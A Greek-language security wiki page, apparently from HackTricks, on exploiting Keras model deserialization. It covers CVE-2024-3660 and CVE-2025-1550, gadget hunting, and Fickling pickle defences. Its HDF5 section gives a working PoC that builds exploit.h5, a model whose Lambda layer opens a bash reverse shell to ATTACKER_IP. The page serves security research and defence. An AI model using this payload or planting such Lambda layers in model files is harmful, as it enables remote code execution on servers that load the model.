# Αποσειριοποίηση μοντέλου Keras: RCE και αναζήτηση gadgets

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα συνοψίζει πρακτικές τεχνικές εκμετάλλευσης της διοχέτευσης αποσειριοποίησης μοντέλων Keras, εξηγεί τα εσωτερικά της εγγενούς μορφής .keras και την επιφάνεια επίθεσης, και παρέχει ένα toolkit για ερευνητές που αναζητούν ευπάθειες σε αρχεία μοντέλων (MFV) και gadgets μετά τις διορθώσεις.

## Εσωτερικά της μορφής μοντέλων .keras

Ένα αρχείο .keras είναι ένα ZIP archive που περιέχει τουλάχιστον:<sup>[[1]](#references)</sup>
- metadata.json – γενικές πληροφορίες (π.χ. έκδοση Keras)
- config.json – αρχιτεκτονική μοντέλου (κύρια επιφάνεια επίθεσης)
- model.weights.h5 – βάρη σε HDF5

Το config.json οδηγεί σε αναδρομική αποσειριοποίηση: το Keras εισάγει modules, επιλύει κλάσεις/συναρτήσεις και ανακατασκευάζει layers/αντικείμενα από dictionaries που ελέγχονται από τον επιτιθέμενο.<sup>[[1]](#references)</sup>

Παράδειγμα αποσπάσματος για ένα αντικείμενο Dense layer:

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

Η αποσειριοποίηση εκτελεί:<sup>[[1]](#references)</sup>
- Εισαγωγή module και επίλυση symbol από τα keys module/class_name
- Κλήση from_config(...) ή constructor με kwargs που ελέγχει ο attacker
- Αναδρομή σε nested objects (activations, initializers, constraints κ.λπ.)

Ιστορικά, αυτό έδινε στον attacker που δημιουργούσε το config.json τρεις δυνατότητες:<sup>[[1]](#references)</sup>
- Έλεγχο των modules που εισάγονται
- Έλεγχο των classes/functions που επιλύονται
- Έλεγχο των kwargs που περνούν στους constructors/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Βασική αιτία:
- Η αποσειριοποίηση legacy Lambda ανακατασκεύαζε μια Python function από marshaled code που ελεγχόταν από τον attacker: η `func_load()` αποκωδικοποιεί το payload από base64, καλεί `marshal.loads()` και δημιουργεί ένα `FunctionType`. Το bytecode της προκύπτουσας function εκτελείται όταν γίνεται invoke η Lambda, ενώ οι affected loaders πριν από την έκδοση 2.13 δεν εφάρμοζαν ελέγχους safe-mode για legacy formats.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

Σε ένα native Keras v3 archive, η Lambda function αναπαρίσταται ως object `__lambda__`, του οποίου το πεδίο `code` περιέχει marshaled code κωδικοποιημένο σε base64:<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

Μετριασμός:
- Το Keras επιβάλλει από προεπιλογή `safe_mode=True` για την εγγενή μορφή Keras v3. Οι σειριοποιημένες Python lambdas στο `Lambda` αποκλείονται, εκτός αν ο χρήστης επιλέξει ρητά να απενεργοποιήσει την προστασία με `safe_mode=False`· αυτή η προστασία δεν καλύπτει με τον ίδιο τρόπο τις παλαιότερες μορφές.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Σημειώσεις:
- Οι παλαιότερες μορφές (παλαιότερα αρχεία HDF5) ή παλαιότερες βάσεις κώδικα ενδέχεται να μην επιβάλλουν τους σύγχρονους ελέγχους, επομένως επιθέσεις τύπου «downgrade» εξακολουθούν να είναι δυνατές όταν τα θύματα χρησιμοποιούν παλαιότερους loaders.

## CVE-2025-1550 – Αυθαίρετη εισαγωγή module στο Keras 3.0.0–3.8.x

Βασική αιτία:
- Η `_retrieve_class_or_fn` χρησιμοποιούσε την `importlib.import_module(module)` με συμβολοσειρές module που ελέγχονταν από τον επιτιθέμενο και προέρχονταν από το `config.json`.
- Επιπτώσεις: Ένα ειδικά διαμορφωμένο αρχείο `.keras` μπορούσε να αναγκάσει τη `Model.load_model()` να εισαγάγει Python modules και functions που επέλεγε ο επιτιθέμενος, με παρενέργειες κατά την εισαγωγή και ορίσματα ελεγχόμενα από τον επιτιθέμενο, ακόμη και με `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Ιδέα εκμετάλλευσης:

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

Βελτιώσεις ασφάλειας (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: οι εισαγωγές περιορίζονται σε επίσημα modules του οικοσυστήματος: keras, keras_hub, keras_cv, keras_nlp
- Safe mode ως προεπιλογή: το safe_mode=True αποκλείει την επικίνδυνη φόρτωση serialized functions του Lambda
- Βασικός έλεγχος τύπων: τα αποσειριοποιημένα αντικείμενα πρέπει να ταιριάζουν με τους αναμενόμενους τύπους

## Πρακτική εκμετάλλευση: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Οι παλαιότερες αναπτύξεις TensorFlow-Keras ενδέχεται να εξακολουθούν να δέχονται αρχεία μοντέλων HDF5 (`.h5`). Αν ένας attacker μπορεί να ανεβάσει ένα μοντέλο το οποίο αργότερα φορτώνει ο server ή εκτελεί inference, ένας ευάλωτος loader μπορεί να αποσειριοποιήσει ένα Lambda layer που περιέχει Python ελεγχόμενη από τον attacker, η οποία μπορεί στη συνέχεια να εκτελεστεί στη ροή εργασίας του μοντέλου της εφαρμογής.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Ελάχιστο PoC για τη δημιουργία ενός κακόβουλου .h5, του οποίου το Lambda εκτελεί reverse shell όταν ο στόχος καλέσει το μοντέλο:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

Σημειώσεις και συμβουλές αξιοπιστίας:
- Τα σημεία ενεργοποίησης διαφέρουν ανάλογα με τη μορφή και τη ροή εργασιών· στο write-up που αναφέρεται, το payload εκτελέστηκε δύο φορές κατά την πρόβλεψη. Θεωρήστε ότι οι παρενέργειες μπορεί να επαναλαμβάνονται και φροντίστε τα payloads να είναι idempotent.<sup>[[7]](#references)</sup>
- Αντιστοίχιση εκδόσεων: χρησιμοποιήστε τις εκδόσεις TF/Keras/Python του στόχου, για να αποφύγετε ασυμφωνίες σειριοποίησης. Για παράδειγμα, δημιουργήστε τα artifacts με Python 3.8 και TensorFlow 2.13.1, αν αυτές είναι οι εκδόσεις που χρησιμοποιεί ο στόχος.<sup>[[7]](#references)</sup>
- Γρήγορη αναπαραγωγή περιβάλλοντος:

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- Επικύρωση: ένα αβλαβές payload όπως `os.system("ping -c 1 YOUR_IP")` βοηθά να επιβεβαιωθεί η εκτέλεση (π.χ., παρατηρώντας τα πακέτα ICMP με το tcpdump) πριν από τη μετάβαση σε reverse shell.<sup>[[7]](#references)</sup>

## Επιφάνεια gadget μετά τη διόρθωση μέσα στο allowlist

Ακόμα και με το allowlist των modules της Keras και την ασφαλή λειτουργία, τα επιτρεπόμενα callables μπορεί να προκαλέσουν παρενέργειες. Για παράδειγμα, το `keras.utils.get_file` κατεβάζει ένα URL και το αποθηκεύει στην καθορισμένη θέση της cache, γεγονός που το καθιστά υποψήφιο για ανάλυση gadget.<sup>[[1]](#references)[[19]](#references)</sup>

Υποψήφια διαμόρφωση Lambda (επικυρώστε την υπογραφή κλήσης σε ελεγχόμενη δοκιμή):

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

Σημαντικός περιορισμός:
- Το `Lambda.call()` περνά πάντα το input του μοντέλου ως πρώτο positional argument και το διαμορφωμένο `arguments` ως keyword arguments. Για το `get_file`, αυτή η positional τιμή συμπληρώνει το `fname`· η ασυμφωνία tensor/path μπορεί να προκαλέσει αποτυχία αυτού του υποψήφιου gadget πριν από οποιοδήποτε download, επομένως δεν αποτελεί εγγυημένα λειτουργικό gadget.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## Allowlisting imports ML pickle για μοντέλα AI/ML (Fickling)

Πολλές μορφές μοντέλων AI/ML (PyTorch `.pt`/`.pth`/`.ckpt`, artifacts joblib/scikit-learn και άλλες εγγενείς μορφές Python) ενσωματώνουν δεδομένα Python pickle. Η παραπάνω legacy διαδρομή Keras Lambda χρησιμοποιεί αντί γι’ αυτό marshaled bytecode συναρτήσεων, οπότε αποτελεί ξεχωριστό κίνδυνο deserialization. Τα pickle opcodes μπορούν να εκτελέσουν συμπεριφορά που ελέγχεται από τον επιτιθέμενο κατά το deserialization, συμπεριλαμβανομένου του model tampering ή του RCE, ενώ απλοί scanners μπορεί να παραβλέψουν νέες ή μη καταχωρισμένες επικίνδυνες imports.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Μια πρακτική άμυνα fail-closed είναι να γίνει hook στον pickle deserializer της Python και να επιτρέπονται μόνο imports που σχετίζονται με ML και έχουν ελεγχθεί ως ακίνδυνες κατά το unpickling. Το Fickling της Trail of Bits υλοποιεί αυτή την πολιτική και διαθέτει μια επιμελημένη allowlist από ML imports, η οποία δημιουργήθηκε με βάση χιλιάδες δημόσια Hugging Face pickles.<sup>[[8]](#references)[[13]](#references)</sup>

Μοντέλο ασφαλείας για “safe” imports (διαισθητικοί κανόνες που προκύπτουν από έρευνα και πρακτική): τα imported symbols που χρησιμοποιούνται από ένα pickle πρέπει ταυτόχρονα:<sup>[[8]](#references)</sup>
- Να μην εκτελούν κώδικα ή προκαλούν εκτέλεσή του (χωρίς compiled/source code objects, εκτέλεση εντολών shell, hooks κ.λπ.)
- Να μην έχουν δυνατότητα ανάγνωσης/εγγραφής αυθαίρετων attributes ή items
- Να μην κάνουν import ή αποκτούν αναφορές σε άλλα Python objects από το pickle VM
- Να μην ενεργοποιούν δευτερεύοντες deserializers (π.χ. marshal, nested pickle), ούτε έμμεσα

Ενεργοποιήστε τις προστασίες του Fickling όσο το δυνατόν νωρίτερα κατά την εκκίνηση της διεργασίας, ώστε να ελέγχονται όλα τα pickle loads που εκτελούνται από frameworks (torch.load, joblib.load κ.λπ.):<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

Συμβουλές λειτουργίας:
- Μπορείτε να απενεργοποιήσετε/ενεργοποιήσετε ξανά προσωρινά τα hooks όπου χρειάζεται:<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- Αν ένα μοντέλο που έχει επιβεβαιωθεί ως ασφαλές αποκλειστεί, διευρύνετε τη λίστα επιτρεπόμενων στοιχείων για το περιβάλλον σας, αφού πρώτα ελέγξετε τα σύμβολα:<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Το Fickling εκθέτει επίσης γενικούς runtime guards, αν προτιμάτε πιο λεπτομερή έλεγχο:<sup>[[9]](#references)</sup>
  - fickling.always_check_safety() για την επιβολή ελέγχων σε όλα τα pickle.load()
  - with fickling.check_safety(): για επιβολή ελέγχων εντός συγκεκριμένου scope
  - fickling.load(path) / fickling.is_likely_safe(path) για μεμονωμένους ελέγχους

- Προτιμήστε μη-pickle μορφές μοντέλων, όπου είναι δυνατό (π.χ. SafeTensors).<sup>[[15]](#references)</sup> Αν πρέπει να δεχτείτε pickle, εκτελέστε τους loaders με τα ελάχιστα απαραίτητα δικαιώματα, χωρίς εξερχόμενη πρόσβαση στο δίκτυο, και επιβάλετε τη χρήση allowlist.

Αυτή η στρατηγική με προτεραιότητα στην allowlist αποκλείει αποδεδειγμένα συνήθεις διαδρομές εκμετάλλευσης ML pickle, διατηρώντας παράλληλα υψηλή συμβατότητα. Στο benchmark της ToB, το Fickling εντόπισε το 100% των συνθετικών κακόβουλων αρχείων και επέτρεψε περίπου το 99% των καθαρών αρχείων από κορυφαία repos του Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Εργαλειοθήκη ερευνητή

1) Συστηματική ανακάλυψη gadget σε επιτρεπόμενα modules

Καταγράψτε υποψήφιες κλήσιμες συναρτήσεις στα keras, keras_nlp, keras_cv, keras_hub και δώστε προτεραιότητα σε όσες έχουν παρενέργειες σε αρχεία/δίκτυο/διεργασίες/περιβάλλον.<sup>[[1]](#references)</sup>

<details>
<summary>Καταγραφή δυνητικά επικίνδυνων κλήσιμων συναρτήσεων σε allowlisted modules</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) Άμεση δοκιμή αποσειριοποίησης (δεν χρειάζεται αρχείο .keras)

Δώστε ειδικά διαμορφωμένα dicts απευθείας στους deserializers του Keras, για να μάθετε ποιες παράμετροι γίνονται αποδεκτές και να παρατηρήσετε παρενέργειες.<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) Δοκιμές μεταξύ εκδόσεων και formats

Το Keras υπάρχει σε πολλαπλές codebases/εποχές με διαφορετικά guardrails και formats:<sup>[[1]](#references)</sup>
- Ενσωματωμένο Keras του TensorFlow: tensorflow/python/keras (legacy, προγραμματισμένο για διαγραφή)
- tf-keras: συντηρείται ξεχωριστά
- Multi-backend Keras 3 (επίσημο): εισήγαγε το εγγενές .keras

Επαναλάβετε τις δοκιμές σε διαφορετικές codebases και formats (.keras έναντι legacy HDF5), για να εντοπίσετε regressions ή guardrails που λείπουν.

## References

- [1] [Εντοπισμός ευπαθειών στην αποσειριοποίηση μοντέλων Keras (blog της huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Προστέθηκαν έλεγχοι στη σειριοποίηση](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE μέσω αποσειριοποίησης Keras Lambda](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Αυθαίρετη εισαγωγή module στο Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [Αναφορά huntr – αυθαίρετη εισαγωγή #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [Αναφορά huntr – αυθαίρετη εισαγωγή #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – RCE μέσω TensorFlow .h5 Lambda έως root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Blog της Trail of Bits – Ο νέος scanner αρχείων pickle AI/ML του Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Ασφάλεια περιβαλλόντων AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Corpus αξιολόγησης σάρωσης pickle του Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Υπόβαθρο για τις επιθέσεις Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Έργο SafeTensors](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Τα επίπεδα Lambda του Keras 2 επιτρέπουν αυθαίρετη εισαγωγή κώδικα](https://kb.cert.org/vuls/id/253266)
- [17] [Πηγαίος κώδικας επιπέδου Lambda του Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Πηγαίος κώδικας βοηθητικών εργαλείων Python του Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [API `get_file` του Keras](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
